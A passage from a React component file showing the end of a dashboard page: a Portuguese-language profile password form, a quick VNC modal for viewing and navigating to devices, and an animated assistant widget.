                      type="password" 
                      value={profileConfirmPassword} 
                      onChange={(e) => setProfileConfirmPassword(e.target.value)} 
                      placeholder=""
                      className="w-full bg-slate-950 border border-[#24242a] focus:border-[#2a2a31]/50 focus:ring-1 focus:ring-[#ef4444]/35 rounded-md px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-[#24242a]"
                    />
                  </div>
                </div>
              </div>
              <button 
                type="submit"
                disabled={isSavingProfile}
                className="w-full py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md text-xs font-bold uppercase tracking-wider shadow-[0_0_15px_rgba(239,68,68,0.2)] transition-all flex items-center justify-center gap-2"
              >
                {isSavingProfile ? 'Salvando...' : 'Salvar Alterações'}
              </button>
            </form>
          </div>
        </div>
      )}

      {quickVncDevices.length > 0 && (
        <QuickVNCModal
          devices={quickVncDevices}
          onClose={() => setQuickVncDevices([])}
          onRemoveDevice={handleRemoveVnc}
          onNavigateToDevice={(deviceId) => {
            setQuickVncDevices([]);
            navigate(`/device/${deviceId}`);
          }}
        />
      )}

      {/*  ROBÔ ASSISTENTE ANIMADO & TUTORIAL */}
      <RobotAssistant />

    </div>
  );
}

